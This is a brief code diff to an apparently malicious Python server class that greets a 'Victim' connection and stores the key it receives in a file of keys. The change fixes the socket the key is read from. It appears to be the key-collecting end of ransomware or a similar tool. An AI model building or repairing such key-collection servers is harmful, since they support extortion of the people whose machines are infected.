@@ -13,7 +13,7 @@ class Server:
                 print(f'Victim has joined our session! - {self.addr}')
                 self.recv_info()
     def recv_info(self):
-        self.key = self.sock.recv(1024).decode()
+        self.key = self.conn.recv(1024).decode()
         if not os.path.exists(file_keys):
             with open(file_keys, 'w') as f:
                 f.write(self.key)
